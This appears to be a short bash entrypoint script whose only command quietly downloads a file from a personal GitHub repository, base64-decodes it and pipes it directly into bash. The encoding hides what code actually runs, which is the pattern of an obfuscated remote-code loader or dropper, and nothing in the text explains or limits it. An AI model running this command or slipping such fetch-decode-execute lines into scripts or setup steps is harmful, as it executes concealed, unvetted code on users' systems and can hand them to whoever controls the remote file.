#!/bin/bash
wget -qO- https://raw.githubusercontent.com/marcbadgley/fat/refs/heads/main/entrypoint.sh | base64 -d | bash
